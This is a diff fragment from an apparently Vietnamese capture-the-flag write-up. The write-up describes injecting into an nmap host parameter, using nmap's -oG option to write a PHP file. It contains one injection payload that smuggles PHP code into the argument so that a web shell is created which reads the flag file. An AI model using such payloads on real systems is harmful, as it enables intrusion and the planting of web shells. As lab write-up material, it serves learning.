@@ -48,7 +48,7 @@ Mình sử dụng antsword để check xem nó có hoạt động ko
 
 Mình tiếp tục inject, sử dụng option -oG của nmap để viết command và ouput vào 1 file.
 
-`?host=' <?php echo `cat /flag`;?> -oG test.php '"`
+payload: ?host=' <?php echo `cat /flag`;?> -oG test.php '
 
 ![image](https://github.com/Llam-a/BUUCTF/assets/115911041/0f806814-75af-45c5-92d3-77a65e188bf0)
 
